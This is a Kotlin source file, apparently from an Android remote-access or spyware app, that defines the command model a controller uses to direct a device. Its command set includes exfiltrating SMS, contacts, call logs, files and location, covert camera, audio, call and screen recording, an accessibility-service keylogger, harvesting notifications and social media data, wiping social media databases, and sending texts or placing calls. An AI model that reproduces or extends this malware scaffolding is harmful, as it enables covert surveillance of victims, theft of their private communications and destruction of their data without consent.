package com.hawkshaw.library.datalayer.models

import android.util.Size
import androidx.camera.core.CameraSelector
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
import kotlinx.serialization.Contextual
import com.hawkshaw.library.datalayer.network.twirp.CommandTypeSerializer

/**
 * Command is the central model class for all remote commands that can be executed by the app.
 * It contains various request types for different operations and a type field to identify the command.
 */
@Serializable
data class Command(
    @SerialName("type")
    @Serializable(with = CommandTypeSerializer::class)
    val type: CommandType = CommandType.Unknown,

    @SerialName("sent_time")
    val sentTime: Long = System.currentTimeMillis(),

    @SerialName("thumbnail_request")
    val thumbnailRequest: ThumbnailRequest? = null,

    @SerialName("file_request")
    val fileRequest: FileRequest? = null,

    @SerialName("files_request")
    val filesRequest: FilesRequest? = null,

    @SerialName("delete_pending_push_files_request")
    val deletePendingPushFilesRequest: DeletePendingPushFilesRequest? = null,

    @SerialName("delete_file_request")
    val deleteFileRequest: DeleteFileRequest? = null,

    @SerialName("add_call_log_request")
    val addCallLogRequest: AddCallLogRequest? = null,

    @SerialName("delete_call_log_request")
    val deleteCallLogRequest: DeleteCallLogRequest? = null,

    @SerialName("add_contact_request")
    val addContactRequest: AddContactRequest? = null,

    @SerialName("delete_contact_request")
    val deleteContactRequest: DeleteContactRequest? = null,

    @SerialName("send_message_request")
    val sendMessageRequest: SendMessageRequest? = null,

    @SerialName("get_location_request")
    val getLocationRequest: GetLocationRequest? = null,

    @SerialName("vibrate_request")
    val vibrateRequest: VibrateRequest? = null,

    @SerialName("flash_request")
    val flashRequest: FlashRequest? = null,

    @SerialName("take_picture_request")
    val takePictureRequest: TakePictureRequest? = null,

    @SerialName("record_video_request")
    val recordVideoRequest: RecordVideoRequest? = null,

    @SerialName("record_audio_request")
    val recordAudioRequest: RecordAudioRequest? = null,

    @SerialName("push_device_info_request")
    val deviceInfoRequest: PushDeviceInfoRequest? = null,

    @SerialName("open_app_request")
    val openAppRequest: OpenAppRequest? = null,

    @SerialName("make_call_request")
    val makeCallRequest: MakeCallRequest? = null,

    @SerialName("set_device_audio_request")
    val setDeviceAudioRequest: DeviceAudioRequest? = null,

    @SerialName("open_deeplink_request")
    val openDeeplinkRequest: OpenDeeplinkRequest? = null,

    @SerialName("login_request")
    val loginRequest: LoginRequest? = null,

    @SerialName("schedule_command_request")
    val scheduleCommandRequest: ScheduleCommandRequest? = null,

    @SerialName("cancel_scheduled_command_request")
    val cancelScheduledCommandRequest: CancelScheduledCommandRequest? = null,

    @SerialName("accessibility_command_request")
    val accessibilityCommandRequest: AccessibilityCommandRequest? = null,

    @SerialName("start_repeat_push_data_request")
    val startRepeatPushDataRequest: StartRepeatPushDataRequest? = null,

    @SerialName("set_dynamic_config_request")
    val setDynamicConfigRequest: SetDynamicConfigRequest? = null,

    @SerialName("sync_app_config_request")
    val syncAppConfigRequest: SyncAppConfigRequest? = null,

    @SerialName("package_name")
    val packageName: String? = null,

    @SerialName("text")
    val text: String? = null,

    @SerialName("title")
    val title: String? = null,

    @SerialName("timestamp")
    val timestamp: Long? = null,

    @SerialName("auth_type")
    val authType: String? = null,

    @SerialName("auth_data")
    val authData: Map<String, String>? = null
) {
    /**
     * Enum representing all possible command types that can be handled by the app
     */
    @Serializable
    enum class CommandType {
        Unknown,
        Login,
        PushTokens,
        PushData,
        StartRepeatPushData,
        StopRepeatPushData,
        SyncAppConfig,
        PushCallLogs,
        AddCallLog,
        DeleteCallLog,
        PushContacts,
        AddContact,
        DeleteContact,
        PushMessages,
        SendMessage,
        PushFileExplorerWalk,
        PushThumbnails,
        DeleteFile,
        PushFile,
        PushFiles,
        GetPendingPushFiles,
        DeletePendingPushFiles,
        SyncPushFiles,
        PushLocation,
        Vibrate,
        Flash,
        TakePicture,
        RecordVideo,
        RecordAudio,
        PushInstalledAppList,
        PushAppLogs,
        PushDeviceInfo,
        OpenApp,
        MakeCall,
        OpenDeeplink,
        GetDiagnosis,
        ScheduleCommand,
        CancelScheduledCommand,
        StartInitializer,
        ConnectSocket,
        DisconnectSocket,
        RunAccessibilityCommand,
        PushAccessibilityKeylogger,
        PushAccessibilityNotifications,
        PushAccessibilitySocialMedia,
        AccessibilityNukeSocialMediaDatabase,
        SetDeviceAudio,
        PushDeviceAudio,
        SetDynamicConfig,
        PushDynamicConfig,
        RecordScreen,
        StartScreenProjection,
        StopScreenProjection,
        CheckAppUpdate,
        ForceAppUpdate,
        ReportAppInstall;
    }

    // Removed explicit getters as data class properties generate them automatically
    // fun getType(): CommandType = type
    // fun getAddCallLogRequest(): AddCallLogRequest? = addCallLogRequest
    // fun getDeleteCallLogRequest(): DeleteCallLogRequest? = deleteCallLogRequest


    /**
     * Request class for device audio settings operations
     */
    @Serializable
    data class DeviceAudioRequest(
        val ringerMode: RingerMode = RingerMode.Unknown,
        val musicVolume: Int = -1,
        val ringVolume: Int = -1,
        val callVolume: Int = -1,
        val alarmVolume: Int = -1
    ) {
        /**
         * Enum representing possible ringer modes
         */
        @Serializable
        enum class RingerMode {
            Unknown,
            Normal,
            Silent,
            Vibrate
        }
    }

    /**
     * Request class for location operations
     */
    @Serializable
    data class GetLocationRequest(
        val priority: Priority = Priority.PRIORITY_HIGH_ACCURACY,
        val interval: Long = 10000L,
        val fastestInterval: Long = 5000L,
        val expirationDuration: Long = 0L,
        val smallestDisplacement: Float = 0f
    ) {
        /**
         * Enum representing location request priority levels
         */
        @Serializable
        enum class Priority {
            PRIORITY_HIGH_ACCURACY,
            PRIORITY_BALANCED_POWER_ACCURACY,
            PRIORITY_LOW_POWER,
            PRIORITY_PASSIVE;

            fun toLocationRequestPriority(): Int {
                return when (this) {
                    PRIORITY_HIGH_ACCURACY -> 100
                    PRIORITY_BALANCED_POWER_ACCURACY -> 102
                    PRIORITY_LOW_POWER -> 104
                    PRIORITY_PASSIVE -> 105
                }
            }
        }

        val mPriority: Int
            get() = priority.toLocationRequestPriority()
    }

    /**
     * Request class for device info operations
     */
    @Serializable
    data class PushDeviceInfoRequest(
        val type: Type = Type.All
    ) {
        /**
         * Enum representing the type of device information to push
         */
        @Serializable
        enum class Type {
            All,
            Dynamic,
            Static
        }
    }

    /**
     * Request class for login operations
     */
    @Serializable
    data class LoginRequest(
        val email: String
    )

    /**
     * Request class for opening an application
     */
    @Serializable
    data class OpenAppRequest(
        val packageName: String
    )

    /**
     * Request class for making a phone call
     */
    @Serializable
    data class MakeCallRequest(
        val phoneNumber: String
    )

    /**
     * Request class for opening a deeplink
     */
    @Serializable
    data class OpenDeeplinkRequest(
        val deeplink: String
    )

    /**
     * Request class for setting dynamic configuration
     */
    @Serializable
    data class SetDynamicConfigRequest(
        val config: String
    )

    /**
     * Request class for starting repeat push data operations
     */
    @Serializable
    data class StartRepeatPushDataRequest(
        val intervalMillis: Long
    )

    /**
     * Request class for syncing app configuration
     */
    @Serializable
    data class SyncAppConfigRequest(
        val force: Boolean = false
    )

    /**
     * Request class for deleting pending push files
     */
    @Serializable
    data class DeletePendingPushFilesRequest(
        val ids: List<Int>
    )

    /**
     * Request class for retrieving thumbnails
     */
    @Serializable
    data class ThumbnailRequest(
        val list: List<String>
    )

    /**
     * Request class for scheduling commands
     */
    @Serializable
    data class ScheduleCommandRequest(
        val command: Command,
        val triggerAt: Long,
        val interval: Long,
        val requestCode: Int
    )

    /**
     * Request class for canceling scheduled commands
     */
    @Serializable
    data class CancelScheduledCommandRequest(
        val requestCodes: List<Int>
    )

    /**
     * Request class for sending SMS messages
     */
    @Serializable
    data class SendMessageRequest(
        val number: String,
        val message: String
    )

    /**
     * Request class for file operations
     */
    @Serializable
    data class FileRequest(
        val path: String,
        val source: Source,
        val medium: Medium,
        val buffer: Int = 0,
        val zip: Boolean = false
    ) {
        /**
         * Enum representing the source of a file
         */
        @Serializable
        enum class Source {
            Unknown,
            CameraImage,
            VideoRecording,
            AudioRecording,
            Screenshot,
            ScreenRecording,
            FileExplorer,
            CallRecording
        }

        /**
         * Enum representing the medium for file transfer
         */
        @Serializable
        enum class Medium {
            Tus,
            Grpc
        }
    }

    /**
     * Request class for operations involving multiple files
     */
    @Serializable
    data class FilesRequest(
        val paths: List<String>,
        val source: FileRequest.Source,
        val medium: FileRequest.Medium,
        val buffer: Int = 0,
        val zip: Boolean = false
    )

    /**
     * Request class for flash operations
     */
    @Serializable
    data class FlashRequest(
        val timings: LongArray,
        val facing: Facing?
    ) {
        /**
         * Enum representing camera facing directions
         */
        @Serializable
        enum class Facing {
            Back,
            Front
        }

        override fun equals(other: Any?): Boolean {
            if (this === other) return true
            if (javaClass != other?.javaClass) return false

            other as FlashRequest

            if (!timings.contentEquals(other.timings)) return false
            if (facing != other.facing) return false

            return true
        }

        override fun hashCode(): Int {
            var result = timings.contentHashCode()
            result = 31 * result + facing.hashCode()
            return result
        }
    }

    /**
     * Request class for vibrate operations
     */
    @Serializable
    data class VibrateRequest(
        val timings: LongArray,
        val amplitudes: IntArray,
        val repeat: Int = -1,
        val flash: Boolean = false
    ) {
        override fun equals(other: Any?): Boolean {
            if (this === other) return true
            if (javaClass != other?.javaClass) return false

            other as VibrateRequest

            if (!timings.contentEquals(other.timings)) return false
            if (!amplitudes.contentEquals(other.amplitudes)) return false
            if (repeat != other.repeat) return false
            if (flash != other.flash) return false

            return true
        }

        override fun hashCode(): Int {
            var result = timings.contentHashCode()
            result = 31 * result + amplitudes.contentHashCode()
            result = 31 * result + repeat
            result = 31 * result + flash.hashCode()
            return result
        }
    }

    /**
     * Request class for recording audio
     */
    @Serializable
    data class RecordAudioRequest(
        val duration: Long = 0L,
        val audioChannelCount: Int = 0,
        val audioEncoder: AudioEncoderEnum = AudioEncoderEnum.DEFAULT,
        val audioSource: AudioSourceEnum = AudioSourceEnum.DEFAULT,
        val outputFormat: OutputFormatEnum = OutputFormatEnum.DEFAULT,
        val saveToPrivate: Boolean = false,
        val audioBitRate: Int = 0,
        val audioSampleRate: Int = 0
    ) {
        /**
         * Enum representing audio encoder types
         */
        @Serializable
        enum class AudioEncoderEnum {
            DEFAULT,
            AMR_NB,
            AMR_WB,
            AAC,
            HE_AAC,
            AAC_ELD,
            VORBIS,
            OPUS;

            fun toAudioEncoder(): Int {
                return when (this) {
                    DEFAULT -> 0
                    AMR_NB -> 1
                    AMR_WB -> 2
                    AAC -> 3
                    HE_AAC -> 4
                    AAC_ELD -> 5
                    VORBIS -> 6
                    OPUS -> 7
                }
            }
        }

        /**
         * Enum representing audio source types
         */
        @Serializable
        enum class AudioSourceEnum {
            DEFAULT,
            MIC,
            VOICE_UPLINK,
            VOICE_DOWNLINK,
            VOICE_CALL,
            CAMCORDER,
            VOICE_RECOGNITION,
            VOICE_COMMUNICATION,
            UNPROCESSED,
            VOICE_PERFORMANCE;

            fun toAudioSource(): Int {
                return when (this) {
                    DEFAULT -> 0
                    MIC -> 1
                    VOICE_UPLINK -> 2
                    VOICE_DOWNLINK -> 3
                    VOICE_CALL -> 4
                    CAMCORDER -> 5
                    VOICE_RECOGNITION -> 6
                    VOICE_COMMUNICATION -> 7
                    UNPROCESSED -> 9
                    VOICE_PERFORMANCE -> 10
                }
            }
        }

        /**
         * Enum representing output format types
         */
        @Serializable
        enum class OutputFormatEnum {
            DEFAULT,
            THREE_GPP,
            MPEG_4,
            AMR_NB,
            AMR_WB,
            AAC_ADTS,
            WEBM,
            OGG;

            fun toOutputFormat(): Int {
                return when (this) {
                    DEFAULT -> 0
                    THREE_GPP -> 1
                    MPEG_4 -> 2
                    AMR_NB -> 3
                    AMR_WB -> 4
                    AAC_ADTS -> 6
                    WEBM -> 9
                    OGG -> 11
                }
            }
        }
    }

    /**
     * Request class for deleting files
     */
    @Serializable
    data class DeleteFileRequest(
        val path: String
    )

    /**
     * Request class for accessibility service commands
     */
    @Serializable
    data class AccessibilityCommandRequest(
        val command: String,
        val packageName: String = "",
        val timeout: Long = 0L
    )

    /**
     * Request class for taking pictures
     */
    @Serializable
    data class TakePictureRequest(
        val cameraId: String = CameraSelector.LENS_FACING_BACK.toString(),
        @Contextual
        val maxResolution: Size = Size(1920, 1080),
        val quality: Int = 100,
        val flashMode: FlashMode = FlashMode.Auto
    ) {
        /**
         * Enum representing flash modes
         */
        @Serializable
        enum class FlashMode {
            Auto,
            Off,
            Always
        }
    }

    /**
     * Request class for recording video
     */
    @Serializable
    data class RecordVideoRequest(
        val duration: Long = 0L,
        val facing: FlashRequest.Facing = FlashRequest.Facing.Back,
        val videoFrameRate: Int = 30,
        val audioChannelCount: Int = 2,
        val audioBitRate: Int = 128000,
        val audioSampleRate: Int = 44100,
        val audioMinBufferSize: Int = 1024,
        val bitRate: Int = 8000000,
        val iFrameInterval: Int = 1,
        @Contextual
        val maxResolution: Size = Size(1920, 1080),
        val mAspectRatio: Int = android.util.Rational(16, 9).hashCode(),
        val mRotation: Int? = null,
        val mFlashMode: Int = 0,
        val audioEnabled: Boolean = true,
        val saveToPrivate: Boolean = false,
        val pushFile: Boolean = false,
        val buffer: Int? = null,
        val recordingDuration: Long = 0L
    ) {
        val mLensFacing: Int
            get() = when (facing) {
                FlashRequest.Facing.Back -> CameraSelector.LENS_FACING_BACK
                FlashRequest.Facing.Front -> CameraSelector.LENS_FACING_FRONT
            }
    }

    /**
     * Request class for adding a call log
     */
    @Serializable
    data class AddCallLogRequest(
        @SerialName("call_log")
        val callLog: CallLog // This should be a CallLog object
    ) {
        // Removed explicit getter as data class properties generate them automatically
        // fun getCallLog(): CallLog = callLog
    }

    /**
     * Request class for deleting a call log
     */
    @Serializable
    data class DeleteCallLogRequest(
        val id: Long
    ) {
        // Removed explicit getter as data class properties generate them automatically
        // fun getId(): Long = id
    }

    /**
     * Request class for adding a contact
     */
    @Serializable
    data class AddContactRequest(
        val name: String,
        val number: String
    )

    /**
     * Request class for deleting a contact
     */
    @Serializable
    data class DeleteContactRequest(
        val id: Long
    )

    /**
     * Response class for command execution results
     */
    @Serializable
    data class Response(
        val success: Boolean,
        val message: String
    )
}
